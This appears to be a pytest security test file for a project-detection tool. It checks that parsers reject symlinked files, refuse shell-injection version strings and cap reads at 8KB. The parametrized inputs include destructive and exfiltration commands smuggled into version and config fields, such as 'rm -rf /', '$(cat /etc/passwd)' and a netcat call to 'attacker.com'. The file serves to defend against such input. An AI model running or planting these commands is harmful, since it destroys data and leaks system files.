"""Security tests for detection enhancements (SEC-DETECT-002).

Tests for security requirements from detection-enhancements-spec.md:
- Symlink traversal protection (SEC-001)
- Version string validation / injection prevention (SEC-002)
- 8KB file read limit (SEC-002)
"""

from pathlib import Path

import pytest

from clauded.detect.database import detect_databases
from clauded.detect.framework import detect_frameworks_and_tools
from clauded.detect.utils import safe_read_text
from clauded.detect.version import parse_java_version, parse_python_version


class TestSymlinkProtection:
    """Security tests for symlink traversal protection (SEC-001)."""

    def test_setup_py_rejects_symlink(self, tmp_path: Path) -> None:
        """setup.py parser must reject symlinked files (SEC-001)."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        external_dir = tmp_path / "external"
        external_dir.mkdir()

        # Create malicious setup.py outside project
        external_setup = external_dir / "setup.py"
        external_setup.write_text('setup(name="malicious", python_requires=">=3.10")')

        # Create symlink inside project pointing to external file
        symlink_setup = project_dir / "setup.py"
        try:
            symlink_setup.symlink_to(external_setup)
        except OSError:
            pytest.skip("Symlink creation not supported on this platform")

        # Attempt to detect version - should NOT read symlinked file
        spec = parse_python_version(project_dir)

        # Should return None (symlink rejected)
        assert spec is None

    def test_build_gradle_kts_rejects_symlink(self, tmp_path: Path) -> None:
        """build.gradle.kts parser must reject symlinked files (SEC-001)."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        external_dir = tmp_path / "external"
        external_dir.mkdir()

        # Create malicious build.gradle.kts outside project
        external_gradle = external_dir / "build.gradle.kts"
        external_gradle.write_text(
            """
java {
    sourceCompatibility = JavaVersion.VERSION_17
}
"""
        )

        # Create symlink inside project
        symlink_gradle = project_dir / "build.gradle.kts"
        try:
            symlink_gradle.symlink_to(external_gradle)
        except OSError:
            pytest.skip("Symlink creation not supported on this platform")

        # Attempt to detect version - should NOT read symlinked file
        spec = parse_java_version(project_dir)

        # Should return None (symlink rejected)
        assert spec is None

    def test_build_gradle_rejects_symlink(self, tmp_path: Path) -> None:
        """build.gradle parser must reject symlinked files (SEC-001)."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        external_dir = tmp_path / "external"
        external_dir.mkdir()

        # Create malicious build.gradle outside project
        external_gradle = external_dir / "build.gradle"
        external_gradle.write_text(
            """
dependencies {
    implementation 'io.ktor:ktor-server-core:2.0.0'
}
"""
        )

        # Create symlink inside project
        symlink_gradle = project_dir / "build.gradle"
        try:
            symlink_gradle.symlink_to(external_gradle)
        except OSError:
            pytest.skip("Symlink creation not supported on this platform")

        # Attempt to detect frameworks - should NOT read symlinked file
        frameworks, _ = detect_frameworks_and_tools(project_dir)

        # Should not detect any frameworks (symlink rejected)
        ktor_items = [fw for fw in frameworks if fw.name == "ktor"]
        assert len(ktor_items) == 0

    def test_docker_compose_rejects_symlink(self, tmp_path: Path) -> None:
        """docker-compose parser must reject symlinked files (SEC-001)."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        external_dir = tmp_path / "external"
        external_dir.mkdir()

        # Create malicious docker-compose.yml outside project
        external_compose = external_dir / "docker-compose.yml"
        external_compose.write_text(
            """
services:
  db:
    image: mongo:7.0
"""
        )

        # Create symlink inside project
        symlink_compose = project_dir / "docker-compose.yml"
        try:
            symlink_compose.symlink_to(external_compose)
        except OSError:
            pytest.skip("Symlink creation not supported on this platform")

        # Attempt to detect databases - should NOT read symlinked file
        databases = detect_databases(project_dir)

        # Should not detect MongoDB (symlink rejected)
        mongodb_items = [db for db in databases if db.name == "mongodb"]
        assert len(mongodb_items) == 0


class TestVersionInjectionPrevention:
    """Security tests for version string validation (SEC-002)."""

    @pytest.mark.parametrize(
        "malicious_version",
        [
            "3.10; rm -rf /",
            "3.10 && curl malicious.com",
            "3.10`whoami`",
            "3.10$(cat /etc/passwd)",
            "3.10|nc attacker.com 4444",
            "../../../etc/passwd",
        ],
    )
    def test_setup_py_rejects_malicious_version_strings(
        self, tmp_path: Path, malicious_version: str
    ) -> None:
        """setup.py parser must reject malicious version strings (SEC-002)."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create setup.py with malicious version string
        setup_py = project_dir / "setup.py"
        setup_py.write_text(
            f"""
setup(
    name="test",
    python_requires="{malicious_version}"
)
"""
        )

        # Attempt to parse - should reject malicious version
        spec = parse_python_version(project_dir)

        # Should return None (version validation failed)
        # OR if it returns a spec, version should be sanitized
        if spec is not None:
            # Version should not contain shell metacharacters
            assert ";" not in spec.version
            assert "&&" not in spec.version
            assert "`" not in spec.version
            assert "$" not in spec.version
            assert "|" not in spec.version
            assert ".." not in spec.version

    @pytest.mark.parametrize(
        "malicious_version",
        [
            "17; rm -rf /",
            "17 && curl malicious.com",
            "17`whoami`",
            "17$(cat /etc/passwd)",
            "../../../etc/passwd",
        ],
    )
    def test_build_gradle_kts_rejects_malicious_version_strings(
        self, tmp_path: Path, malicious_version: str
    ) -> None:
        """build.gradle.kts parser must reject malicious version strings (SEC-002)."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create build.gradle.kts with malicious version string
        gradle_kts = project_dir / "build.gradle.kts"
        gradle_kts.write_text(
            f"""
java {{
    sourceCompatibility = JavaVersion.VERSION_{malicious_version}
}}
"""
        )

        # Attempt to parse - should reject malicious version
        spec = parse_java_version(project_dir)

        # Should return None (version validation failed)
        # OR if it returns a spec, version should be numeric only
        if spec is not None:
            # Java versions should be numeric only
            assert spec.version.isdigit() or "." in spec.version


class TestFileReadLimits:
    """Security tests for 8KB file read limit (SEC-002)."""

    def test_setup_py_respects_8kb_limit(self, tmp_path: Path) -> None:
        """setup.py parser must limit file reads to 8KB (SEC-002)."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create large setup.py file (>8KB)
        setup_py = project_dir / "setup.py"
        large_content = "# " + ("X" * 10000) + "\n"  # >8KB of comments
        large_content += 'setup(name="test", python_requires=">=3.10")\n'
        setup_py.write_text(large_content)

        # Verify file is actually >8KB
        assert setup_py.stat().st_size > 8192

        # Attempt to parse - should work with 8KB limit
        # Parser should either:
        # 1. Successfully parse if python_requires is within first 8KB
        # 2. Return None if python_requires is beyond 8KB (acceptable)
        spec = parse_python_version(project_dir)

        # Test passes if no exception raised (limit enforced)
        # Result depends on where python_requires is in file
        # Since it's at the end, likely returns None
        assert spec is None  # python_requires beyond 8KB limit

    def test_build_gradle_kts_respects_8kb_limit(self, tmp_path: Path) -> None:
        """build.gradle.kts parser must limit file reads to 8KB (SEC-002)."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create large build.gradle.kts file (>8KB)
        gradle_kts = project_dir / "build.gradle.kts"
        large_content = "// " + ("X" * 10000) + "\n"  # >8KB of comments
        large_content += """
java {
    sourceCompatibility = JavaVersion.VERSION_17
}
"""
        gradle_kts.write_text(large_content)

        # Verify file is actually >8KB
        assert gradle_kts.stat().st_size > 8192

        # Attempt to parse - should work with 8KB limit
        spec = parse_java_version(project_dir)

        # Test passes if no exception raised (limit enforced)
        assert spec is None  # sourceCompatibility beyond 8KB limit

    def test_build_gradle_respects_8kb_limit(self, tmp_path: Path) -> None:
        """build.gradle parser must limit file reads to 8KB (SEC-002)."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create large build.gradle file (>8KB)
        gradle = project_dir / "build.gradle"
        large_content = "// " + ("X" * 10000) + "\n"  # >8KB of comments
        large_content += """
dependencies {
    implementation 'io.ktor:ktor-server-core:2.0.0'
}
"""
        gradle.write_text(large_content)

        # Verify file is actually >8KB
        assert gradle.stat().st_size > 8192

        # Attempt to detect frameworks - should work with 8KB limit
        frameworks, _ = detect_frameworks_and_tools(project_dir)

        # Test passes if no exception raised (limit enforced)
        ktor_items = [fw for fw in frameworks if fw.name == "ktor"]
        assert len(ktor_items) == 0  # dependencies beyond 8KB limit

    def test_safe_read_text_enforces_8kb_default_limit(self, tmp_path: Path) -> None:
        """safe_read_text() must enforce 8KB default limit (SEC-002)."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create large file (>8KB)
        large_file = project_dir / "large.txt"
        large_content = "X" * 10000  # 10KB
        large_file.write_text(large_content)

        # Verify file is actually >8KB
        assert large_file.stat().st_size > 8192

        # Read with safe_read_text - should limit to 8KB
        content = safe_read_text(large_file, project_dir)

        # Content should be limited to 8KB (8192 bytes)
        assert content is not None
        assert len(content) <= 8192
        assert len(content) == 8192  # Should read exactly 8KB

    def test_safe_read_text_allows_custom_limit(self, tmp_path: Path) -> None:
        """safe_read_text() allows custom limit for special cases."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create file
        test_file = project_dir / "test.txt"
        test_file.write_text("Hello World")

        # Read with custom limit
        content = safe_read_text(test_file, project_dir, limit=5)

        # Should respect custom limit
        assert content is not None
        assert len(content) == 5
        assert content == "Hello"


class TestMongoDBDetectionSecurity:
    """Security tests specific to MongoDB detection."""

    def test_mongodb_env_file_prevents_injection(self, tmp_path: Path) -> None:
        """MongoDB env var detection must not execute injected code (SEC-002)."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create .env.example with injection attempt in value
        env_file = project_dir / ".env.example"
        env_file.write_text("MONGODB_URI=mongodb://localhost:27017/mydb; rm -rf /\n")

        # Detect databases - should safely parse without executing
        databases = detect_databases(project_dir)

        # Should detect MongoDB without executing injected code
        mongodb_items = [db for db in databases if db.name == "mongodb"]
        assert len(mongodb_items) == 1
        # Test passes if no exception or side effects

    def test_mongodb_docker_compose_injection_prevention(self, tmp_path: Path) -> None:
        """MongoDB docker-compose detection prevents injection (SEC-002)."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create docker-compose with injection attempt
        compose_file = project_dir / "docker-compose.yml"
        compose_file.write_text(
            """
services:
  db:
    image: mongo:7.0; rm -rf /
"""
        )

        # Detect databases - YAML parser should fail on malformed content
        # or detection should safely handle it
        databases = detect_databases(project_dir)

        # Test passes if no exception raised during detection
        # Either parsing fails (safe) or detection handles safely
        mongodb_items = [db for db in databases if db.name == "mongodb"]
        # Result doesn't matter - just ensure no code execution
        assert isinstance(mongodb_items, list)


class TestKtorDetectionSecurity:
    """Security tests for Ktor framework detection."""

    def test_ktor_build_gradle_prevents_injection(self, tmp_path: Path) -> None:
        """Ktor detection from build.gradle prevents injection (SEC-002)."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create build.gradle with injection attempt
        gradle = project_dir / "build.gradle"
        gradle.write_text(
            """
dependencies {
    implementation 'io.ktor:ktor-server-core; rm -rf /:2.0.0'
}
"""
        )

        # Detect frameworks - should safely parse without executing
        frameworks, _ = detect_frameworks_and_tools(project_dir)

        # Should handle malformed dependency safely
        ktor_items = [fw for fw in frameworks if fw.name == "ktor"]
        # Either detects nothing (parsing failed) or detects safely
        assert isinstance(ktor_items, list)
